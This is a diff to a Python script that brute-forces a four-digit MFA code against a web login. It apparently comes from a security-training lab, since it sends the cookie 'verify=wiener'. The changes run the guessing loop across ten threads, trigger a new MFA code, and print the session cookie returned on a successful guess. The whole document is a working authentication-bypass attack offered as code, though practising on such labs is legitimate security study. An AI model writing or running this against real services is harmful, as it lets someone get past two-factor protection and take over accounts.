@@ -1,5 +1,6 @@
 #!/bin/python3
 
+import concurrent.futures
 import requests
 import sys
 import urllib3
@@ -16,7 +17,8 @@ def get_2fa():
     cookie_dict={"verify": "wiener"}
     r=requests.get(HOST+PATH, cookies=cookie_dict,proxies=proxies,verify=False)
     res = r.status_code
-    print(res)
+    if res == 200:
+        print(f"We got a {res} on that request so there's a new MFA active.")
 
 
 
@@ -29,17 +31,17 @@ def submit_mfa(MFA):
     r=requests.post(HOST+PATH, data=MFA_payload, cookies=cookie_dict,proxies=proxies,verify=False)
     res = r.status_code
     if r.history:
-        print("We got redirected..")
+        print(f"We got redirected..thanks to MFA code: {MFA}")
         for resp in r.history:
-            (print(resp.status_code, resp.url))
+            print(resp.status_code, resp.url)
+            print(f"Here's a cookie for ya: {resp.cookies}")
         return 42
 
-def pin_loop():
-    for num in range(1,9999):
-        test_pin=f"{num:04d}"
-        print(f"Now testing: {test_pin}")
-        if submit_mfa(test_pin) == 42:
-            break
+def pin_loop(num):
+    test_pin=f"{num:04d}"
+    print(f"Now testing: {test_pin}")
+    if submit_mfa(test_pin) == 42:
+        return
 
 if __name__ == "__main__":
     try:
@@ -51,6 +53,6 @@ if __name__ == "__main__":
         print("[-] Example: %s www.example.com" % sys.argv[0])
         exit(-1)
 
-    # get_2fa()
-    # submit_mfa("1732")
-    pin_loop()
+    get_2fa()
+    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+        executor.map(pin_loop,range(1,10000))
